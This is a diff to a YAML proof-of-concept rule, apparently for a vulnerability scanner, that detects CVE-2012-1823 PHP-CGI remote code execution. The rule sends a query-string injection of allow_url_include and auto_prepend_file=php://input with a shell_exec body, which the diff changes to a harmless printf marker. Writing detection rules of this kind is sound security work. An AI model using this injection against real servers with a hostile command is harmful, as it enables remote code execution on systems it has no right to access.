@@ -2,11 +2,11 @@ name: poc-yaml-php-cgi-rce
 rules:
   - method: POST
     path: /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
-    body: <?php echo shell_exec("echo test CVE-2012-1823 by xray"); ?>
+    body: <?php echo shell_exec(" printf  2012%%1823"); ?>
     follow_redirects: false
     expression: >-
       status==200 &&
-      body.bcontains(b'test CVE-2012-1823 by xray')
+      body.bcontains(b'2012%1823')
 detail:
     author: leezp
     Affected PHP Version: "php < 5.3.12 or php < 5.4.2"
